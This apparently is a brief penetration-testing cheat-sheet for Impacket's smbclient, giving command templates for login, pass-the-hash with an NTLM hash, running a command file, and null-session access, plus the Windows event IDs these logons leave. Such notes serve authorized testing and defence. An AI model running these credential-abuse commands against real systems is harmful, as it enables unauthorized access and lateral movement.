### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py  

### Impacket smbclient (supports pass-the-hash)
```
impacket-smbclient <domain>/<user>:<password>@<rhost>
```

### Using pass the hash and file with commands to execute
```
impacket-smbclient -hashes :<ntlmHash> <domain>/<user>@<rhost> -file <commandFile>.txt
```

### Connect using null session
```
impacket-smbclient <rhost>
```

### Opsec considerations - Windows Security Log Event IDs
```
-Logon (4624) -> multiple
-Special Logon (4672) -> multiple
```

